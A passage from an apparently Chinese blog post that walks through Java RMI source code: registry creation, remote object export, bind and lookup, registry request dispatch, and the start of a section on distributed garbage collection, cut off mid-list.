<p>在setup方法中会调用uref.exportObject(this,null,ture)方法：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250709145402351.png" alt="image-20250709145402351"></p>
<p>其中this为RegistryImpl对象</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250709150048125.png" alt="image-20250709150048125"></p>
<p>先看第一个，在UnicastServerRef.exportObject方法中会调用Util.createProxy创建一个代理类，看名字似乎是创建stub客户端存根，跟进createProxy方法：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250709150925975.png" alt="image-20250709150925975"></p>
<p>关键是这段，他先调用stubClassExists方法：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250709151023637.png" alt="image-20250709151023637"></p>
<p>该方法会寻找RegistryImpl_stub，然后返回ture</p>
<p>接着进入createStub方法，remoteClass就是我们的RegistryImpl对象：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250709151332772.png" alt="image-20250709151332772"></p>
<p>这里的逻辑就是会返回RegistryImpl_stub实例，即stub变量就是RegistryImpl_stub实例</p>
<p>接着回到我们的UnicastServerRef.exportObject方法，看第二部分：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250709151632319.png" alt="image-20250709151632319"></p>
<p>当stub为RemoteStub实例时会调用setSkeleton(impl)，而stub是RegistryImpl_stub实例继承RemoteStub，所以会调用setSkeleton(impl)，impl为RegistryImpl对象，看方法名似乎是设置服务端存根Skeleton，跟进一下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250709152024487.png" alt="image-20250709152024487"></p>
<p>这里调用Util.createSkeleton(impl)方法并赋值给skel：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250709152355545.png" alt="image-20250709152355545"></p>
<p>这里获取Registry_Skel赋值给skelname变量，最后返回Registry_Skel实例，所以第二部分就是将Registry_Skel实例赋值给skel，相当于创建Skeleton根存</p>
<p>最后看第三部分：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250709152728637.png" alt="image-20250709152728637"></p>
<p>最后实例化了一个Target类，这个Target对象封装了我们RegistryImpl对象和RegistryImpl_Stub对象</p>
<p>接着调用liveRef.exportObject将我们封装好的对象发布出去，具体看看它的发布逻辑：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250709172411239.png" alt="image-20250709172411239"></p>
<p>ep的值就跟我们前面的创建的LiveRef对象有关了，查看构造方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250709172949321.png" alt="image-20250709172949321"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250709173226184.png" alt="image-20250709173226184"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250709173321043.png" alt="image-20250709173321043"></p>
<p>ep为endpoint，而根据我们之前创造的LiveRef对象，ep为TCPEndpoint.getLocalEndpoint(port)：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250709173731622.png" alt="image-20250709173731622"></p>
<p>该方法调用getLoclaEndpoint方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250709174216894.png" alt="image-20250709174216894"></p>
<p>而在getLoclaEndpoint方法中会创建一个TCPEndpoint对象并获取了端口号等信息，最后返回ep，所以最后会调用TCPEndpoint.exportObject(target)方法：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250709210325033.png" alt="image-20250709210325033"></p>
<p>然后调用transport.exportObject(target)，这里transport为TCPTransport对象，即调用TCPTransport.exportObject(target):<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250710102555375.png" alt="image-20250710102555375"></p>
<p>这里调用了listen()方法开启监听：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250710092931067.png" alt="image-20250710092931067"></p>
<p>在TCPTransport.listen中，先获取 TCPEndpoint，获取端口号后执行<code>server = ep.newServerSocket();</code>创建一个新的socket，就等别人来连接:</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250710093246692.png" alt="image-20250710093246692"></p>
<p>而在建立socket过程中，如果端口号为0即默认值，就会创建一个随机端口，而创建注册中心时我们传入了端口，所以端口为5432:</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250710093457076.png" alt="image-20250710093457076"></p>
<p>之后在调用<code>super.exportObject(target);</code>完成连接之后的事，跟进Transport.exportObject(target)：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250710102703906.png" alt="image-20250710102703906"></p>
<p>主要将Target对象存放进ObjectTable中，ObjectTable用来管理所有发布的服务实例Target</p>
<p>这时我们来看看Stub的值：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250711163644365.png" alt="image-20250711163644365"></p>
<p>新出现了DGCImpl_Stub，而Skel也变为了DGCImpl_Skel，这是分布式垃圾回收的一个对象，这个后面再提。</p>
<p>发布完后最后返回stub</p>
<p>最后看下发布对象后的变量：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250710100004461.png" alt="image-20250710100004461"></p>
<p>skel为Registry_Skel对象，stub为RegietryImpl_Stub对象</p>
<h5 id="创建远程对象"><a href="#创建远程对象" class="headerlink" title="创建远程对象"></a>创建远程对象</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RMIInterface o=<span class="keyword">new</span> <span class="title class_">RMItest</span>();</span><br></pre></td></tr></table></figure>

<p>这里创建了远程对象实例</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250709154218314-17520469398211.png" alt="image-20250709154218314"></p>
<p>调用父类的构造方法，即UnicastRemoteObject的构造方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250709154340649.png" alt="image-20250709154340649"></p>
<p>这里默认port为0，所以后面创建socket时会分配随机端口，调用exportObject方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250709154708191.png" alt="image-20250709154708191"></p>
<p>返回一个exportObject对象，传入obj和UnicastServerRef对象，UnicastServerRef对象主要用于指定端口创建远程对象通信，obj为我们的远程对象RMItest，继续跟进exportObject方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250709155512366.png" alt="image-20250709155512366"></p>
<p>后面进入sref.exportObject方法了：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250709160244608.png" alt="image-20250709160244608"></p>
<p>后面的流程就跟创建注册中心时的一样，但参数不一样，先看stub赋值：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250709161240235.png" alt="image-20250709161240235"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250709161214866.png" alt="image-20250709161214866"></p>
<p>由于在Util.createProxy中会调用stubClassExists方法来寻找是否存在RMItest_Stub对象，但由于我们并没有注册，所以肯定是没有的，此时就不会调用createStub方法，而是跳出执行后面的方法：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250709162602433.png" alt="image-20250709162602433"></p>
<p>clientRef是UnicastRef对象，这里用RemoteObjectInvocationHandler为UnicastRef对象创建了动态代理</p>
<p>最后返回一个Remote类型的代理类，当调用代理类的方法时，就会调用RemoteObjectInvocationHandler.invoke方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250709163709760.png" alt="image-20250709163709760"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250709163954589.png" alt="image-20250709163954589"></p>
<p>在invoke方法中会对调用方法类型进行判断，allowFinalizeInvocation默认为true，当调用方法为Object对象时调用invokeObjectMethod方法，否则调用invokeRemoteMethod方法</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250709164158605.png" alt="image-20250709164158605"></p>
<p>而在invokeObjectMethod方法中，只对hashCode、equals、toString方法进行处理</p>
<p>而在另一个invokeRemoteMethod方法中，调用了另一invoke方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250709164535895.png" alt="image-20250709164535895"></p>
<p>这里的ref是我们创建动态代理时传入的对象：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250709170113725.png" alt="image-20250709170113725"></p>
<p>为UnicastRef，跟进UnicastRef.invoke：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250709170252692.png" alt="image-20250709170252692"></p>
<p>这段代码主要用于建立通道连接</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250709170924820.png" alt="image-20250709170924820"></p>
<p>然后进行远程方法的调用，try部分主要是序列化调用参数，序列化失败时会抛出错误</p>
<p>接着看UnicastServerRef.exportObject方法</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250709171856409.png" alt="image-20250709171856409"></p>
<p>由于这时stub是代理类，所以不会执行setSkeleton方法</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250709172034601.png" alt="image-20250709172034601"></p>
<p>最后实例化了一个Target类，这个Target对象封装了我们远程对象和生成的动态代理类</p>
<p>然后调用exportObject(target)发布我们封装好的对象：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250710100642524.png" alt="image-20250710100642524"></p>
<p>注意TCPEndpoint.newServerSocket在创建socket过程中会随机分配端口</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250710101126223.png" alt="image-20250710101126223"></p>
<p>可以看到执行完后随机分配了56272端口</p>
<p>后面同样的流程，开启监听后执行super.exportObject(target);方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250711163351013.png" alt="image-20250711163351013"></p>
<p>即transport.exportObject(target)：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250711163434555.png" alt="image-20250711163434555"></p>
<p>主要就是将我们主要将Target对象存放进ObjectTable中，ObjectTable用来管理所有发布的服务实例Target，执行期间Stub和Skel成为了DGCImpl_Stub和DGCImpl_Skel分布式垃圾回收对象</p>
<h5 id="绑定远程服务对象"><a href="#绑定远程服务对象" class="headerlink" title="绑定远程服务对象"></a>绑定远程服务对象</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Naming.rebind(RMI_NAME,o);  <span class="comment">//也可以选用bind方法</span></span><br></pre></td></tr></table></figure>

<p>将相应的远程对象和RMI服务端地址RMI_NAME进行绑定</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250710110101484.png" alt="image-20250710110101484"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250710111216157.png" alt="image-20250710111216157"></p>
<p>先获取服务器地址URL，然后对其名字，host，port进行解析，然后获取相应端口的Stub（RegistryImpl_Stub对象），然后调用<code>Stub.rebind(parsed.name, obj);</code>方法，传入的是远程对象和RMI_NAME解析后的名字:</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250710110558010.png" alt="image-20250710110558010"></p>
<p>先调用super.ref.newCall方法，也就是UnicastRef.newCall方法，该方法主要是建立一个网络连接：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250710111856838.png" alt="image-20250710111856838"></p>
<p>然后获取remoteCall的流，用同个流对名字和远程对象进行序列化操作，这里的操作主要是为了将RMI服务器名字和远程对象进行绑定：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250710112053138.png" alt="image-20250710112053138"></p>
<p>接着执行ref.invoke方法进行网络传输，这里this.ref为UnicastRef，传入remoteCall：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250710112404355.png" alt="image-20250710112404355"></p>
<p>跟进去，发现在StreamRemoteCall.executeCall方法中调用了readObject方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250710113145296.png" alt="image-20250710113145296"></p>
<p>最后在服务端骨架处反序列化绑定</p>
<h4 id="客户端-1"><a href="#客户端-1" class="headerlink" title="客户端"></a>客户端</h4><h5 id="获取注册中心"><a href="#获取注册中心" class="headerlink" title="获取注册中心"></a>获取注册中心</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(HOST,PORT);</span><br></pre></td></tr></table></figure>

<p>通过指定host和port获取指定注册中心的客户端存根</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250710115215120.png" alt="image-20250710115215120"></p>
<p>调用getRegistry方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250710115302292.png" alt="image-20250710115302292"></p>
<p>该方法最后返回调用Util.createProxy方法返回指定注册中心的客户端代理Stub</p>
<h5 id="查找获取远程对象"><a href="#查找获取远程对象" class="headerlink" title="查找获取远程对象"></a>查找获取远程对象</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RMIInterface o=(RMIInterface) Naming.lookup(RMI_NAME);</span><br></pre></td></tr></table></figure>

<p>通过 RMI 命名服务查找并获取远程对象的存根（stub）</p>
<p>Naming.lookup()是RMI 的命名服务类，提供基于名称的对象查找功能：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250710143646649.png" alt="image-20250710143646649"></p>
<p>获取服务器地址URL，然后对其名字，host，port进行解析，然后获取相应端口的Stub（RegistryImpl_Stub对象）：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250710143905408.png" alt="image-20250710143905408"></p>
<p>然后调用Stub.lookup，即RegistryImpl_Stub.lookup方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250710144222432.png" alt="image-20250710144222432"></p>
<p>先通过UnicastRef.newCall方法建立连接，然后获取remoteCall的流将其序列化发送到服务端，接着调用UnicastRef.invoke方法执行远程调用将请求发送到 RMI 注册表服务器，服务端在注册表中查找对应名称的绑定：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250710150421152.png" alt="image-20250710150421152"></p>
<p>调用call.executeCall()方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250710150754684.png" alt="image-20250710150754684"></p>
<p>调用了in.readObject方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250710150914832.png" alt="image-20250710150914832"></p>
<p>其中in是通过getInputStream获得的，是数据流里的东西</p>
<p>然后通过反序列化动态获取注册远程对象时创建的代理类：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250710155026707.png" alt="image-20250710155026707"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250710155919688.png" alt="image-20250710155919688"></p>
<h5 id="调用远程对象方法"><a href="#调用远程对象方法" class="headerlink" title="调用远程对象方法"></a>调用远程对象方法</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(o.Hello());</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250710160253844.png" alt="image-20250710160253844"></p>
<p>获取了远程对象的Stub代理类后，当执行方法时就会触发RemoteObjectInvocationHandler.invoke方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250710160648810.png" alt="image-20250710160648810"></p>
<p>在创建远程对象时我们已经分析过了，这里的hello方法自然不是一个Object方法，会调用invokeRemoteMethod方法作为返回值：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250710160830404.png" alt="image-20250710160830404"></p>
<p>接着调用UnicastRef.invoke方法，这和前面lookup和rebind中的invoke不一样不要混淆了：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250710162101894.png" alt="image-20250710162101894"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250710162212529.png" alt="image-20250710162212529"></p>
<p>它先创建一个连接通道，然后建立连接</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250710162326212.png" alt="image-20250710162326212"></p>
<p>这里将call序列化到输出流中</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250710162720361.png" alt="image-20250710162720361"></p>
<p>调用streamRemoteCall.executeCall()方法触发调用进行网络通信</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250710163015184-17521362165531.png" alt="image-20250710163015184"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250710163033363.png" alt="image-20250710163033363"></p>
<p>然后进行反序列化，返回反序列化结果</p>
<h4 id="注册中心处理请求"><a href="#注册中心处理请求" class="headerlink" title="注册中心处理请求"></a>注册中心处理请求</h4><p>在注册端，是由sun.rmi.transport.tcp.TCPTransport#handleMessages方法来处理请求的</p>
<p>当服务传入rmi调用时，如客户端或服务端与 RMI 注册中心交互或者客户端调用远程方法时，就是进入第一个swith&#x2F;case语句：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250710172243047.png" alt="image-20250710172243047"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250710171941533.png" alt="image-20250710171941533"></p>
<p>调用了serviceCall方法，call就是通过某个连接对象获取相应的remoteCall对象</p>
<p>TCPTransport继承了Transport类，由于子类没有这个方法，会去调用父类的serviceCall方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250710172920185.png" alt="image-20250710172920185"></p>
<p>大体逻辑是从ObjectTable中获取封装的Target对象：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250710173216448.png" alt="image-20250710173216448"></p>
<p>获取其中的RegistryImpl对象</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250710173245341.png" alt="image-20250710173245341"></p>
<p>获取disp，就是前面创建注册中心和创建远程对象时看到的UnicastServerRef对象：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250710173703920.png" alt="image-20250710173703920"></p>
<p>然后调用了对象的dispatch方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250710173834287.png" alt="image-20250710173834287"></p>
<p>跟进UnicastServerRef.dispatch方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250710181436426.png" alt="image-20250710181436426"></p>
<p>调用oldDispatch方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250710181551892.png" alt="image-20250710181551892"></p>
<p>接着调用skel.dispatch方法，即Registrylmpl_Skel.dispatch方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250710182257818.png" alt="image-20250710182257818"></p>
<p>当var3为0时是处理bind的请求，将remoteCall字节流进行反序列化以获取这个远程对象和RMI服务名称，并通过Registry.bind绑定RMI服务</p>
<p>而当var3处理lookup的请求对应另一个case语句：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250710182921855.png" alt="image-20250710182921855"></p>
<p>逻辑是类似的，其他情况分别对应其他操作注册表的方法，如rebind，unbind，list等等。</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>总结一下RMI请求序列化和反序类化的过程：</p>
<ul>
<li>remoteCall序列化RMI服务名称和远程对象</li>
<li>Registry_Skel.dispatch方法处（注册中心）反序列化remoteCall字节流</li>
<li>反射调用RMI服务实现类的对应方法并序列化执行结果</li>
<li>将方法执行结果的序列化流反序列化，返回给客户端</li>
</ul>
<h2 id="DGC"><a href="#DGC" class="headerlink" title="DGC"></a>DGC</h2><p>前面在分析源码时提到了DGC，其实这个挺重要的，这里简要说一下</p>
<p>DGC(Distributed Garbage Collection)，<strong>分布式垃圾回收</strong>。</p>
<p>在Java虚拟机中，一个远程对象不仅会被本地虚拟机内的变量引用，也能被远程引用，而只有当一个远程对象不受到任何本地引用和远程引用或者如果引用的“租期”过期并没有更新时，这个远程对象才会结束生命周期，此时服务器会将垃圾回收远程对象。</p>
<p>服务端的一个远程对象一般在3个地方被引用：</p>
<ul>
<li>服务端的一个本地对象持有它的<strong>本地引用</strong></li>
<li>服务端的远程对象已经注册到<strong>RMI Registry注册表</strong>中，即RMI Registry注册表有它的远程引用</li>
<li>客户端获得远程对象的<strong>存根对象</strong>，即客户端持有它的远程引用</li>
</ul>
<p>而服务端判断客户端是否持有远程对象引用的方法：</p>
<ul>
<li>当客户端获得一个服务端的远程对象的存根时，就会向服务器发送一条租约(lease)通知，以告诉服务器自己持有了这个对象的引用了。</li>
